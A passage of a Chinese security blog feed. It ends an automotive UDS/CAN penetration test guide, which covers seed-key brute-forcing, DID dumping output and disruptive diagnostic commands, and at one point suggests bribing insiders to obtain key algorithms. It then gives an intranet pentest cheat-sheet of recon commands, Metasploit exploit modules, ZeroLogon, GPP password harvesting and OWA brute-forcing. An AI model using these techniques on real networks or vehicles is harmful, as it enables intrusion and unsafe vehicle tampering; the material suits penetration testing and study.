src="/images/CAN%E6%80%BB%E7%BA%BF%E6%B5%8B%E8%AF%95%E6%A0%B7%E4%BE%8B/image-20230803140624032.png" alt="image-20230803140624032" /></p><h1 id="uds种子密钥安全性测试安全访问-27"><a class="markdownIt-Anchor" href="#uds种子密钥安全性测试安全访问-27"></a> UDS种子密钥安全性测试（安全访问 27）</h1><h2 id="测试内容-7"><a class="markdownIt-Anchor" href="#测试内容-7"></a> 测试内容</h2><p>安全访问常见威胁为：种子随机度不足、未限制Seed尝试次数、未限制Key尝试次数、安全算法泄露等</p><h2 id="测试初始条件-7"><a class="markdownIt-Anchor" href="#测试初始条件-7"></a> 测试初始条件</h2><h2 id="项目步骤-7"><a class="markdownIt-Anchor" href="#项目步骤-7"></a> 项目步骤</h2><p>**种子随机度及Seed尝试次数测试：**切换到编程模式或扩展模式下多次发送<code>02 27 01</code>，观察Seed的长度，Seed是否会更新，更新是否有规律。一般认为Seed Key在4字节以上才算基本安全</p><p><strong>Key尝试次数测试：</strong> 以Key为4字节为例，发送<code>02 27 01</code>后，遍历发送<code>06 27 02 【AA BB CC DD】</code> ，观察消极响应的错误码是否会发生改变。</p><p><strong>安全算法泄露：</strong> 可以通过地下论坛、买通企业内部人员、Tier1泄露、固件逆向等找到原始的诊断Key算法。还可以通过购买通用的诊断仪如X-431，各种清DTC设备等，分析多个解锁Seed Key找出规律。</p><h2 id="结果-7"><a class="markdownIt-Anchor" href="#结果-7"></a> 结果</h2><p>如上</p><h1 id="uds敏感数据读取"><a class="markdownIt-Anchor" href="#uds敏感数据读取"></a> UDS敏感数据读取</h1><h2 id="测试内容-8"><a class="markdownIt-Anchor" href="#测试内容-8"></a> 测试内容</h2><p>通过DID读取数据服务，服务ID是0x22。通过22服务可以请求一个DID的数据，也可以请求多个，其数量限制也由OEM和供应商来约定。无论请求的DID数量是多少，只要满足数量限制，那么ECU都应该在一次肯定响应里包含所有数据。</p><h2 id="测试初始条件-8"><a class="markdownIt-Anchor" href="#测试初始条件-8"></a> 测试初始条件</h2><h2 id="项目步骤-8"><a class="markdownIt-Anchor" href="#项目步骤-8"></a> 项目步骤</h2><p>遍历did范围为：<code>0x0000-0xffff</code>。确定呼应为<code>62+DID+数据</code>，否认呼应为<code>7f+22+NRC码</code> 当客户端发送<code>22+F186</code>这个请求时，接收端确定会前往以后的会话状况， 返回如<code>62+F186+（01 or 02 or 03）</code>的数据包</p><h2 id="结果-8"><a class="markdownIt-Anchor" href="#结果-8"></a> 结果</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">┌──(j3fffff㉿j3fffff)-[~]</span><br><span class="line">└─$ cc.py uds dump_dids 0x733 0x633</span><br><span class="line"></span><br><span class="line">-------------------</span><br><span class="line">CARING CARIBOU v0.4</span><br><span class="line">-------------------</span><br><span class="line"></span><br><span class="line">Loading module &#x27;uds&#x27;</span><br><span class="line"></span><br><span class="line">Dumping DIDs in range 0x0000-0xffff</span><br><span class="line"></span><br><span class="line">Identified DIDs:</span><br><span class="line">DID    Value (hex)</span><br><span class="line">0xd134 62d13400</span><br><span class="line">0xd211 62d21105ffffffff04ffffffff06ffffffff04ffffffff06ffffffff04ffffffff06ffffffff04ffffffff02ffffffff07ffffffff</span><br><span class="line">0xd902 62d90200</span><br><span class="line">0xd903 62d903cfcf</span><br><span class="line">0xd904 62d90476</span><br><span class="line">0xd906 62d9063232</span><br><span class="line">0xd909 62d90976</span><br><span class="line">0xd910 62d910ffff</span><br><span class="line">0xd911 62d91101</span><br><span class="line">0xd914 62d91404</span><br><span class="line">0xd915 62d91504</span><br><span class="line">0xd916 62d91600</span><br><span class="line">0xd917 62d91700</span><br><span class="line">0xd918 62d91800</span><br><span class="line">0xd919 62d91901</span><br><span class="line">0xd920 62d92001</span><br><span class="line">0xd921 62d92100</span><br><span class="line">0xd922 62d9220000</span><br><span class="line">0xda00 62da000496ff940baa</span><br><span class="line">0xda01 62da01fc08ff780bf5</span><br><span class="line">0xda02 62da0201</span><br><span class="line">0xda03 62da0301</span><br><span class="line">0xdd00 62dd00ffffffff</span><br><span class="line">0xdd01 62dd0100ffff</span><br><span class="line">0xdd02 62dd02ff</span><br><span class="line">0xdd0a 62dd0a01</span><br><span class="line">0xdd0b 62dd0b000800</span><br><span class="line">0xdd0c 62dd0c00</span><br><span class="line">0xe103 62e10300000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">0xed20 62ed20f1a08888398000202045f1aa8888788308202041f1ab8888754619202043f18c30497611f1ae03888869688820204288886968902020428888939131202042</span><br><span class="line">0xeda0 62eda0f12031661232204145f12a31666456204141f12bffffffff202020f18c30497611f12e03316663532041423166635520414232250007204142</span><br><span class="line">0xf120 62f12031661232204145</span><br><span class="line">0xf121 62f12131661230204142</span><br><span class="line">0xf125 62f12531661225204144</span><br><span class="line">0xf126 62f126001e020002040003ffffff001e020000040003001e030001040003001e0313040400030000ffffffffffff0000ffffffffffff</span><br><span class="line">0xf12a 62f12a31666456204141</span><br><span class="line">0xf12b 62f12bffffffff202020</span><br><span class="line">0xf12e 62f12e03316663532041423166635520414232250007204142</span><br><span class="line">0xf186 62f18601</span><br><span class="line">0xf18c 62f18c30497611</span><br><span class="line">0xf1a0 62f1a08888398000202045</span><br><span class="line">0xf1a1 62f1a18888398001202042</span><br><span class="line">0xf1a5 62f1a58888397961202044</span><br><span class="line">0xf1aa 62f1aa8888788308202041</span><br><span class="line">0xf1ab 62f1ab8888754619202043</span><br><span class="line">0xf1ae 62f1ae03888869688820204288886968902020428888939131202042</span><br><span class="line">0xf1fd 62f1fd31352e30302e3030</span><br><span class="line">Done!</span><br></pre></td></tr></table></figure><h1 id="uds捣乱服务"><a class="markdownIt-Anchor" href="#uds捣乱服务"></a> UDS捣乱服务</h1><h2 id="测试内容-9"><a class="markdownIt-Anchor" href="#测试内容-9"></a> 测试内容</h2><p>在各种工况条件下测试车辆在接收到其他CAN指令时（如28指令），是否会导致整车的ECU出现故障</p><h2 id="测试初始条件-9"><a class="markdownIt-Anchor" href="#测试初始条件-9"></a> 测试初始条件</h2><h2 id="项目步骤-9"><a class="markdownIt-Anchor" href="#项目步骤-9"></a> 项目步骤</h2><p>分别在各种条件(静止、行驶、低电压等)上发送28命令和85命令，观察车内ECU是否有响应和动作。</p><h2 id="结果-9"><a class="markdownIt-Anchor" href="#结果-9"></a> 结果</h2><p>实际测试中某些整车发送28后，整车控制会部分失灵、仪表显示也会异常，但一般动力相关ECU仍能正常动作(也可能进入失效模式)</p><h1 id="uds固件刷写"><a class="markdownIt-Anchor" href="#uds固件刷写"></a> UDS固件刷写</h1><h2 id="测试内容-10"><a class="markdownIt-Anchor" href="#测试内容-10"></a> 测试内容</h2><p>固件刷写中主要威胁点在于34 36未做相关的限制条件。使其可以在不进行安全认证或不安全的条件下进行刷写。</p><h2 id="测试初始条件-10"><a class="markdownIt-Anchor" href="#测试初始条件-10"></a> 测试初始条件</h2><h2 id="项目步骤-10"><a class="markdownIt-Anchor" href="#项目步骤-10"></a> 项目步骤</h2><p>分别尝试在普通模式、编程模式、扩展模式下发送固件刷写相关命令。切换会话的条件，发送相关命令。</p><p><img src="/images/CAN%E6%80%BB%E7%BA%BF%E6%B5%8B%E8%AF%95%E6%A0%B7%E4%BE%8B/84d32e0f7176c23c7ca5928eb869d02d.png" alt="image.png" /></p><h2 id="结果-10"><a class="markdownIt-Anchor" href="#结果-10"></a> 结果</h2><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><ol><li><p><a href="https://blog.ffxiv.cat/174/">UDS诊断渗透测试思路</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/37310388">UDS诊断入门</a></p></li><li><p><a href="https://iotsec-zone.com/article?id=393">UDS刷写安全</a></p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;can重放逆向&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#can重放逆向&quot;&gt;&lt;/a&gt; CAN重放（逆向）&lt;/h1&gt;
&lt;h2 id=&quot;测试内容&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#测试内容&quot;&gt;&lt;/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>内网安全（二）——补充版</title>
    <link href="https://j3f5.github.io/articles/2023/07/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/"/>
    <id>https://j3f5.github.io/articles/2023/07/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/</id>
    <published>2023-07-28T02:07:35.000Z</published>
    <updated>2023-07-28T02:07:35.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><p>鉴于之前的内网安全这篇文章所述内容与实战相差还是有点大，没有很清晰的思路或者更加常用的方法来进行内网渗透，这里将结合之前的部分知识，拓展内网渗透攻击面，其中会涉及到很多名词，例如：</p><ul><li>委派机制（约束与非约束）</li><li>Exchange、OWA的渗透</li><li>SYSVOL、NETLOGON目录、GPP目录等</li><li>…</li></ul><p>但是万变不离其宗，思路为：</p><ol><li><p>拿下边缘主机，做好权限维持，网段进行扫描发现主机</p><ol><li>如若必要，权限提升</li><li>如若必要，进行免杀</li></ol></li><li><p>横向，隧道/代理</p><ol><li>横向包括文件传输与命令执行、权限提升与维持</li><li>代理隧道需要确定通行的协议</li><li>横向中常遇到的一些服务</li></ol></li><li><p>域控</p><ol><li>获得权限三板斧：组策略、哈希碰撞、金银票据</li><li>这个还涉及dump凭证的操作，在内网主机中也适用</li></ol></li></ol><p>其实不仅如此，内网安全包括域渗透和工作组渗透。</p><p>基于此思路。此篇文章从三个方面做总结，分别为边缘+横向+域控。</p><h1 id="信息搜集"><a class="markdownIt-Anchor" href="#信息搜集"></a> 信息搜集</h1><p>这里，需要搜集的东西有很多，每个都有相应的作用，搜集信息分为两个方面，一个是本机信息搜集，一个是域内信息搜集。</p><h2 id="本机信息搜集"><a class="markdownIt-Anchor" href="#本机信息搜集"></a> 本机信息搜集</h2><h3 id="手动"><a class="markdownIt-Anchor" href="#手动"></a> 手动</h3><ol><li><p>操作系统：有的操作系统用的指令不同，例如关闭防火墙，还有的漏洞就不同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure></li><li><p>杀毒软件/进程/服务列表：分析杀毒软件/安全监控工具等 邮件客户端 VPN ftp等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc</span><br><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure></li><li><p>端口：看有什么服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure></li><li><p>服务：看有什么服务是错误配置的，例如路径错误</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure></li><li><p>安装的软件版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br><span class="line"></span><br><span class="line">powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;</span><br></pre></td></tr></table></figure></li><li><p>补丁：看有什么提权漏洞没有被修补的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 本地执行</span><br><span class="line">wmic qfe get Caption, Description, HotFixID, InstalledOn</span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line"># msf/empire 都有相应的模块</span><br><span class="line">msf&gt; use post/windows/gather/enum_patches</span><br><span class="line">msf&gt; use post/multi/recon/local_exploit_suggester</span><br><span class="line">empire&gt; powershell/situational_awareness/host/winenum</span><br><span class="line"></span><br><span class="line"># 脚本工具</span><br><span class="line">windows exploit suggseter</span><br></pre></td></tr></table></figure></li><li><p>权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看Mandatory Lable，提升到HIGH最好啦</span><br><span class="line">whoami /groups </span><br></pre></td></tr></table></figure></li><li><p>会话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure></li><li><p>共享</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net share</span><br><span class="line">wmic share get name,path,status</span><br></pre></td></tr></table></figure></li><li><p>计划任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure></li><li><p>路由/缓存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br><span class="line">arp –a</span><br></pre></td></tr></table></figure></li></ol><h3 id="自动化脚本"><a class="markdownIt-Anchor" href="#自动化脚本"></a> 自动化脚本</h3><p>wmic 脚本下载地址：<a href="https://www.fuzzysecurity.com/scripts/files/wmic_info.rar">https://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p><p>PowerShsell Empire</p><p>MSF</p><h2 id="域信息搜集"><a class="markdownIt-Anchor" href="#域信息搜集"></a> 域信息搜集</h2><p>主要包括：</p><ol><li><p>权限：</p></li><li><p>域sid：可以用来构造金银票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wimc username get /all</span><br></pre></td></tr></table></figure></li><li><p>搜集用户信息：</p><ol><li><p>枚举LDAP：搜集用户信息，可以用于密码喷洒攻击，获得更多用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -n -sV --script &quot;ldap* and not brute&quot; -p 389 &lt;dc-ip&gt;</span><br><span class="line">ldapsearch -x -H ldap://192.168.31.242:389 -s base</span><br></pre></td></tr></table></figure></li><li><p>发现域内用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">net user /domain</span><br><span class="line">wimc username get /all</span><br><span class="line"># 本地管理员名</span><br><span class="line">net localgroup administrators</span><br><span class="line"></span><br><span class="line"># 脚本工具</span><br><span class="line">## Adfind</span><br><span class="line">AdFind.exe -users name</span><br><span class="line">## emun4linux</span><br><span class="line">enum4linux -a -u &quot;&quot; -p &quot;&quot; &lt;dc-ip&gt;</span><br></pre></td></tr></table></figure></li></ol></li><li><p>当前域和工作组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure></li><li><p>判断主域、域控IP、域控名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 主域名</span><br><span class="line">net view /domain</span><br><span class="line"># 域用户组</span><br><span class="line">net group /domain</span><br><span class="line"># 域管理员列表</span><br><span class="line">net group &quot;Domain Admins&quot; /domain</span><br><span class="line"># 域控IP</span><br><span class="line">nslookup -type=SRV _ldap.tcp</span><br><span class="line"># 域控名</span><br><span class="line">nltest /DCLIST:&lt;domain&gt;</span><br><span class="line">net time /domain</span><br></pre></td></tr></table></figure></li><li><p>域内存活主机：获得存活主机，则可以对主机进行攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># ICMP探测</span><br><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr &quot;TTL=&quot;</span><br><span class="line"></span><br><span class="line"># 工具</span><br><span class="line">## crackmapexec</span><br><span class="line">## fscan</span><br><span class="line">fscan -h 192.168.1.1/24</span><br><span class="line">## adfind</span><br><span class="line">## ntbscan</span><br><span class="line">ntbscan 192.168.1.1/24</span><br></pre></td></tr></table></figure></li><li><p>域密码策略：使用密码喷洒时需要注意的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net accounts /domain</span><br></pre></td></tr></table></figure></li><li><p>smb共享列表（匿名）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">enum4linux -a -u &quot;&quot; -p &quot;&quot; &lt;dc-ip&gt;</span><br><span class="line">enum4linux -a -u &quot;guest&quot; -p &quot;&quot; &lt;dc-ip&gt;</span><br><span class="line"></span><br><span class="line">smbmap -u &quot;&quot; -p &quot;&quot; -P 445 -H &lt;dc-ip&gt;</span><br><span class="line">smbmap -u &quot;guest&quot; -p &quot;&quot; -P 445 -H &lt;dcip&gt;</span><br><span class="line"></span><br><span class="line">cme smb &lt;ip&gt; -u &#x27;&#x27; -p &#x27;&#x27; # 枚举可空Session访问的SMB共享</span><br><span class="line">cme smb &lt;ip&gt; -u &#x27;a&#x27; -p &#x27;&#x27; #枚举可匿名访问的SMB共享</span><br></pre></td></tr></table></figure></li><li><p>后台RCE：如果后台存在漏洞，就可以直接打</p></li><li><p>SPN服务：</p></li></ol><h2 id="相关知识点"><a class="markdownIt-Anchor" href="#相关知识点"></a> 相关知识点</h2><h3 id="windows-名称解析机制"><a class="markdownIt-Anchor" href="#windows-名称解析机制"></a> windows 名称解析机制</h3><p>在内网中通信的时候，基于计算机名称解析的时候走的就是windows名称解析机制，其中参与协议的有三个，分别是 DNS LLMNR NETBIOS 这三种。</p><h4 id="解析顺序"><a class="markdownIt-Anchor" href="#解析顺序"></a> 解析顺序</h4><p>先进行 DNS 名称解析，如果 DNS 解析名称失败，则会使用 LLMNR 进行名称解析，最后才会使用 NetBIOS 名称解析。</p><h4 id="llmnr"><a class="markdownIt-Anchor" href="#llmnr"></a> LLMNR</h4><p>该服务监听端口5355。LLMNR，从 Windows Vista 起，Windows 操作系统开始支持一种新的名称解析协议 —— LLMNR，主要用于局域网中的名称解析。</p><p>原因就是 LLMNR 能够很好的支持 IPv4 和 IPv6，因此在 Windows 名称解析顺序中是一个仅次于 DNS 的名称解析方式，更重要的是在 Linux 操作系统中也实现了 LLMNR。</p><p>LLMNR 进行名称解析的过程为:</p><ul><li>检查本地 NetBIOS 缓存</li><li>如果缓存中没有则会像当前子网域发送广播包</li><li>当前子网域的其他主机收到并检查广播包，如果没有主机响应则请求失败</li></ul><h4 id="netbios"><a class="markdownIt-Anchor" href="#netbios"></a> NetBios</h4><p>NETBIOS服务监听的端口为 UDP/137，其进行名称解析的形式为向当前主机所在的子网域发送广播包。所以，当你使用抓包工具在局域网中抓包时总会收到很多 NBNS 数据包。</p><p>综上所述，NetBIOS 协议进行名称解析的过程如下：</p><ul><li>检查本地 NetBIOS 缓存</li><li>如果缓存中没有请求的名称且已配置了 WINS 服务器，接下来则会向 WINS 服务器发出请求</li><li>如果没有配置 WINS 服务器或 WINS 服务器无响应则会向当前子网域发送广播</li><li>如果发送广播后无任何主机响应则会读取本地的 lmhosts 文件</li></ul><h4 id="投毒"><a class="markdownIt-Anchor" href="#投毒"></a> 投毒</h4><p>与DNS投毒类似。其他投毒还有：ARP投毒等。</p><h3 id="ldap"><a class="markdownIt-Anchor" href="#ldap"></a> LDAP</h3><p>LDAP（Lightweight Directory Access Protocol，轻量目录访问协议）是一种用于访问和维护分布式目录信息服务的协议，例如域控制器中的用户、组、计算机等信息。LDAP连接是指使用LDAP客户端软件或工具，通过LDAP协议，向LDAP服务器（如域控制器）发起连接请求，并提供认证信息，以便查询或修改目录中的数据</p><p>LDAP连接的地址一般是类似于<code>ldap://servername/DN</code>的格式，其中servername是LDAP服务器的名称或IP地址，DN是Distinguished Name，即目录中对象的唯一标识。</p><blockquote><p>例如，如果您想要使用LDAP Browser客户端工具连接到域控制器<code>dc1.example.com</code>，并查询域<code>example.com</code>中的对象，您可以输入<code>ldap://dc1.example.com/dc=example,dc=com</code>作为连接地址</p></blockquote><h3 id="权限划分"><a class="markdownIt-Anchor" href="#权限划分"></a> 权限划分</h3><p>Windows的权限分为四种：User、Administrator、System、TrustedInstaller。最后一个权限是最高的，只有他能够修改系统文件，这个是SYSTEM做不到的，它可以改很多文件，并且DUMP散列值等。</p><h1 id="初步渗透"><a class="markdownIt-Anchor" href="#初步渗透"></a> 初步渗透</h1><p>这一阶段，主要依靠搜集来的信息，对域内主机、域内用户发起攻击，主要有三个部分，分别为：</p><ol><li>各种主机的初步漏洞尝试</li><li>密码喷洒</li><li>中间人攻击/重放攻击</li></ol><h2 id="常见漏洞尝试"><a class="markdownIt-Anchor" href="#常见漏洞尝试"></a> 常见漏洞尝试</h2><p>这段时期，应该已经做好了补丁的探测，然后对以下相关漏洞进行测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">java rmi： exploit/multi/misc/java_rmi_server</span><br><span class="line">ms17-010：exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">tomcat：auxiliary/scanner/http/tomcat_enum</span><br><span class="line">jboss manager：exploit/multi/http/tomcat_mgr_deploy</span><br><span class="line">Java反序列化漏洞测试：ysoserial</span><br><span class="line">查找产品的CVE漏洞：searchsploit</span><br><span class="line">MS14-025： searchsploit</span><br><span class="line">findstr /S /I cpassword \\&lt;FQDN&gt;\sysvol\&lt;FQDN&gt;\policies\*.xml</span><br><span class="line">爆破数据库连接：use admin/mssql/mssql_enum_sql_logins</span><br><span class="line">proxylogon：</span><br><span class="line">proxyshell：</span><br></pre></td></tr></table></figure><h3 id="zerologonon域控admin-主机admin"><a class="markdownIt-Anchor" href="#zerologonon域控admin-主机admin"></a> ZeroLogonon【域控admin、主机admin】</h3><blockquote><p>TAG：域控权限、不用凭证</p></blockquote><h4 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h4><p>ZeroLogon (CVE-2020-1472) 影响域内登录认证协议Netlogon (MS-NRPC) 中所使用的加密身份验证方案 (AES-CFB8)，在通过NetLogon协议与AD域控建立安全通道时，强行登录尝试，对全零的纯文本应用AES-CFB8加密将导致全零的密文，从而可以绕过正常认证，进一步可获取域管理员HASH，获取域管权限。</p><p>总的来说，就是绕过正常认证，获取域管权限，但是这个可能会让这个主机脱域，慎重！</p><h4 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h4><p><a href="https://blog.csdn.net/Captain_RB/article/details/120643838">https://blog.csdn.net/Captain_RB/article/details/120643838</a></p><p>已完成复现</p><h3 id="永恒之蓝域控admin-主机admin"><a class="markdownIt-Anchor" href="#永恒之蓝域控admin-主机admin"></a> 永恒之蓝【域控admin、主机admin】</h3><p><a href="https://www.cnblogs.com/9eek/p/16703300.html">永恒之蓝（Eternal Blue）是一种利用Windows系统的SMB协议漏洞来获取系统的最高权限的攻击方式</a>。可以使用msf中的<code>exploit/windows/smb/ms17_010_eternalblue</code>来进行攻击。</p><h3 id="sysvol-gpp-ms14-025"><a class="markdownIt-Anchor" href="#sysvol-gpp-ms14-025"></a> SYSVOL &amp; GPP MS14-025</h3><h4 id="相关知识"><a class="markdownIt-Anchor" href="#相关知识"></a> 相关知识</h4><p><strong>SYSVOL（System Volume）是Windows操作系统中的一个共享文件夹，用于存储登录脚本、组策略模板和其他域范围的公共文件</strong>。它是在Windows域控制器上自动创建的，用于在整个域中分发和复制系统策略、登录脚本和其他相关文件。SYSVOL 使用分布式文件系统（DFS）来确保这些文件在域控制器之间进行复制和同步。所有的域组策略存储在：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\</span><br></pre></td></tr></table></figure><p><strong>GPP（Group Policy Preferences）是一种Windows组策略扩展，允许管理员在域环境中配置用户和计算机设置</strong>。GPP 允许管理员设置各种设置，如映射网络驱动器、创建本地用户账户、配置注册表设置等。<strong>GPP 可以通过组策略在域中的计算机和用户之间分发这些设置</strong>。</p><blockquote><p>映射驱动（Drives.xml）<br />创建本地用户<br />数据源（DataSources.xml）<br />打印机配置（Printers.xml）<br />创建/更新服务（Services.xml）<br />计划任务（ScheduledTasks.xml）<br />更改本地Administrator密码</p></blockquote><p><strong>在早期的 Windows 版本中，GPP 存储了一些敏感数据（如密码）的 XML 文件，这些文件以安全不当的方式存储在 SYSVOL 共享中，导致了潜在的安全风险</strong>。</p><p><strong>攻击者可以通过解析这些 XML 文件，从中获取敏感数据，甚至可以获取本地管理员密码等。这种漏洞可以被恶意利用，使得攻击者能够在域环境中进行更大范围的攻击，例如横向移动和提权。</strong></p><h4 id="攻击路线"><a class="markdownIt-Anchor" href="#攻击路线"></a> 攻击路线</h4><ol><li>手工查找：<code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\</code></li><li>使用msf：<code>post/windows/gather/credentials/gpp </code>，<code>auxiliary/scanner/smb/smb_enum_gpp</code></li><li>使用powersploit：<code>Get-GPPPassword.ps1</code></li></ol><h3 id="exchange相关"><a class="markdownIt-Anchor" href="#exchange相关"></a> Exchange相关</h3><p>exchange一般都在域内的核心位置上，包括甚至安装在域控服务器上，因此我们需要多多关注exchange的相关漏洞，如果拿下exchange机器，则域控也不远了。</p><p>Exchange的proxyshell和proxylogon漏洞是两组不同的漏洞，但都可以让攻击者远程执行任意代码并控制Exchange服务器。简单地说：</p><ul><li><strong>proxylogon</strong>是CVE-2021-26855的名称，它是一个存在于Microsoft Exchange Server的漏洞，可以使攻击者<strong>绕过身份验证并模拟用户</strong>。攻击者可以利用这个漏洞访问本地Exchange服务器，从而可以访问邮箱账号，并且安装其他恶意软件对受害机器进行长期的控制。</li><li><strong>proxyshell</strong>是CVE-2021-34473、CVE-2021-34523和CVE-2021-31207的组合利用，它们也是存在于Microsoft Exchange Server的漏洞，可以使攻击者<strong>绕过身份验证并执行任意命令</strong>。攻击者可以利用这些漏洞创建一个Webshell，从而可以远程控制Exchange服务器，并且执行任何操作。</li></ul><h4 id="信息搜集-2"><a class="markdownIt-Anchor" href="#信息搜集-2"></a> 信息搜集</h4><ol><li><p>邮箱用户密码爆破：</p><p>使用ruler工具对owa接口进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ruler —domain targetdomain.com brute —users /path/to/user.txt —passwords 